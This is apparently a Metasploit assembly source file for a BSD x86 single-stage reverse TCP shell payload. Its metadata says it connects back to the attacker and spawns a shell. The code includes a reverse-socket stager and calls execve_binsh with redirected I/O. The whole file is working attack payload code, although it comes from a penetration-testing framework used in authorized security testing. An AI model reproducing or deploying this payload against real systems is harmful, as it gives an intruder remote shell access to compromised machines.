;;
; 
;        Name: single_reverse_tcp_shell
;     Version: $Revision: 1626 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Single reverse TCP shell.
;
; Meta-Information:
;
; meta-shortname=BSD Reverse TCP Shell
; meta-description=Connect back to the attacker and spawn a shell
; meta-authors=skape <mmiller [at] hick.org>
; meta-os=bsd
; meta-arch=ia32
; meta-category=single
; meta-connection-type=reverse
; meta-name=reverse_tcp_shell
; meta-basemod=Msf::PayloadComponent::ReverseConnection
; meta-offset-lhost=0x0a
; meta-offset-lport=0x13
;;
BITS   32

%define  USE_SINGLE_STAGE 1
%define  ASSUME_REG_EAX   0

; If you're on FreeBSD you can assume the state of edx to be 2, but NetBSD 
; clears edx.
; %define  ASSUME_REG_EDX   2

%include "stager_sock_reverse_ipv6.asm"
%include "generic.asm"

shell:
	execve_binsh EXECUTE_REDIRECT_IO
